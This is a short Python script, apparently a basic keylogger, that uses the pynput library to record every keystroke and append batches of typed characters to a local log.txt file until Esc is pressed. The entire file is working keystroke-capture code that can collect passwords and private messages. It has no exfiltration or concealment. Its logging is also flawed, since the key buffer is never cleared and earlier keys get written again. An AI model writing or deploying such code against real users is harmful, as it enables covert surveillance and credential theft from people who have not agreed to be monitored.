import pynput
from pynput.keyboard import Listener, Key

count = 0
keys = []

def press(key):
    global count, keys
    keys.append(key)
    count +=1
    print("pressed", key)
    if count >= 10:
        count = 0
        write_file(keys)


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)





def release(key):
    if key == Key.esc:
        return False
    



with Listener(on_press=press, on_release=release) as listener:
    listener.join()